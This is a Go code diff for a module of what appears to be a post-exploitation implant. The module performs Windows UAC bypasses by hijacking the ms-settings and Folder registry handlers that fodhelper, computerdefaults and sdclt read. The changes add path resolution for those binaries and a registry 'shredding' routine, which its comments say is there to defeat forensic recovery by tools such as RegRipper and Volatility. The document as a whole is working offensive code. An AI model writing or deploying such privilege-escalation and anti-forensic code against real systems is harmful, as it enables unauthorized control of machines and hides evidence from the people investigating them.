@@ -4,10 +4,12 @@
 package commands
 
 import (
+	crand "crypto/rand"
 	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -73,9 +75,9 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 
 	switch strings.ToLower(args.Technique) {
 	case "fodhelper":
-		return uacBypassMsSettings(args.Command, `C:\Windows\System32\fodhelper.exe`, "fodhelper")
+		return uacBypassMsSettings(args.Command, resolveSystem32Binary("fodhelper.exe"), "fodhelper")
 	case "computerdefaults":
-		return uacBypassMsSettings(args.Command, `C:\Windows\System32\computerdefaults.exe`, "computerdefaults")
+		return uacBypassMsSettings(args.Command, resolveSystem32Binary("computerdefaults.exe"), "computerdefaults")
 	case "sdclt":
 		return uacBypassSdclt(args.Command)
 	default:
@@ -85,6 +87,19 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 			Completed: true,
 		}
 	}
+}
+
+// resolveSystem32Binary dynamically resolves a System32 path using
+// environment variables instead of hardcoding C:\Windows.
+func resolveSystem32Binary(binaryName string) string {
+	windir := os.Getenv("WINDIR")
+	if windir == "" {
+		windir = os.Getenv("SystemRoot")
+	}
+	if windir == "" {
+		windir = `C:\Windows`
+	}
+	return filepath.Join(windir, "System32", binaryName)
 }
 
 // isElevated checks if the current process token is elevated
@@ -160,9 +175,9 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 
 	// Step 3: Wait briefly then clean up registry
 	time.Sleep(2 * time.Second)
-	output += "[*] Step 3: Cleaning up registry...\n"
+	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupMsSettingsKey()
-	output += "[+] Registry keys removed\n\n"
+	output += "[+] Registry keys shredded and removed\n\n"
 
 	output += "[+] UAC bypass triggered successfully.\n"
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
@@ -175,10 +190,11 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	}
 }
 
-// cleanupMsSettingsKey removes the ms-settings hijack registry keys
+// cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
 func cleanupMsSettingsKey() {
-	// Delete in reverse order: deepest key first
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open\command`)
+	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
+	shredRegistryKey(registry.CURRENT_USER, keyPath)
+	// Delete parent keys (deepest first)
 	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
 	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
 	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
@@ -187,9 +203,11 @@ func cleanupMsSettingsKey() {
 // uacBypassSdclt implements the sdclt.exe Folder handler hijack.
 // sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
 func uacBypassSdclt(command string) structs.CommandResult {
+	sdcltPath := resolveSystem32Binary("sdclt.exe")
+
 	var output string
 	output += "[*] UAC Bypass Technique: sdclt\n"
-	output += fmt.Sprintf("[*] Trigger binary: C:\\Windows\\System32\\sdclt.exe\n")
+	output += fmt.Sprintf("[*] Trigger binary: %s\n", sdcltPath)
 	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)
 
 	regKeyPath := `Software\Classes\Folder\shell\open\command`
@@ -230,7 +248,7 @@ func uacBypassSdclt(command string) structs.CommandResult {
 
 	// Step 2: Launch sdclt.exe
 	output += "[*] Step 2: Launching sdclt.exe...\n"
-	cmd := exec.Command(`C:\Windows\System32\sdclt.exe`)
+	cmd := exec.Command(sdcltPath)
 	if err := cmd.Start(); err != nil {
 		cleanupSdcltKey()
 		return structs.CommandResult{
@@ -243,9 +261,9 @@ func uacBypassSdclt(command string) structs.CommandResult {
 
 	// Step 3: Wait briefly then clean up registry
 	time.Sleep(2 * time.Second)
-	output += "[*] Step 3: Cleaning up registry...\n"
+	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupSdcltKey()
-	output += "[+] Registry keys removed\n\n"
+	output += "[+] Registry keys shredded and removed\n\n"
 
 	output += "[+] UAC bypass triggered successfully.\n"
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
@@ -258,10 +276,53 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	}
 }
 
-// cleanupSdcltKey removes the Folder handler hijack registry keys
+// cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
 func cleanupSdcltKey() {
-	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open\command`)
+	keyPath := `Software\Classes\Folder\shell\open\command`
+	shredRegistryKey(registry.CURRENT_USER, keyPath)
 	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
 	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
 	// Don't delete Software\Classes\Folder — it may have legitimate content
+}
+
+// shredRegistryValue overwrites a registry string value with random data 3 times
+// before deleting it. This defeats forensic recovery of deleted registry values
+// from hive slack space (RegRipper, Registry Explorer, Volatility).
+func shredRegistryValue(key registry.Key, valueName string) {
+	for i := 0; i < 3; i++ {
+		_ = key.SetStringValue(valueName, randomShredString())
+	}
+	_ = key.DeleteValue(valueName)
+}
+
+// shredRegistryKey opens a registry key, shreds all its string values, then
+// deletes the key. Falls back to plain DeleteKey if the key can't be opened
+// for writing (e.g., insufficient permissions).
+func shredRegistryKey(hive registry.Key, path string) {
+	key, err := registry.OpenKey(hive, path, registry.SET_VALUE|registry.QUERY_VALUE)
+	if err != nil {
+		// Can't open for writing — just try to delete
+		_ = registry.DeleteKey(hive, path)
+		return
+	}
+	names, err := key.ReadValueNames(-1)
+	if err == nil {
+		for _, name := range names {
+			shredRegistryValue(key, name)
+		}
+	}
+	key.Close()
+	_ = registry.DeleteKey(hive, path)
+}
+
+// randomShredString generates a random 64-character string for registry
+// value overwriting. Uses crypto/rand for unpredictable content.
+func randomShredString() string {
+	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 64)
+	_, _ = crand.Read(b)
+	for i := range b {
+		b[i] = charset[b[i]%byte(len(charset))]
+	}
+	return string(b)
 }
